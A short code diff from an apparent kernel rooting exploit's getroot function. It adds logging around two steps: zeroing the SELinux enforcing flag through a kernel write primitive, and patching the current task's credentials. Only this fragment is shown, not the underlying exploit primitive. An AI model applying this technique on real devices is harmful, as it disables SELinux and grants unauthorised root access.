@@ -36,12 +36,20 @@ int getroot(struct offsets* o, uint64_t current_task_addr)
 	sidtab = o->sidtab;
 	policydb = o->policydb;
 
-	if(o->selinux_enforcing)
-		write_at_address_pipe(o->selinux_enforcing, &zero, sizeof(zero));
+	if(o->selinux_enforcing) {
+		ret = write_at_address_pipe(o->selinux_enforcing, &zero, sizeof(zero));
+		if (ret == 0)
+			PNFO("selinux set to permissive\n");
+		else
+			PERR("failed to set selinux permissive\n");
+	}
 
-	if((ret = modify_task_cred_uc(task)))
+	if((ret = modify_task_cred_uc(task))) {
+		PERR("failed to modify current task credentials\n");
 		goto end;
+	}
 
+	PNFO("current task credentials patched\n");
 	ret = 0;
 end:
 	return ret;
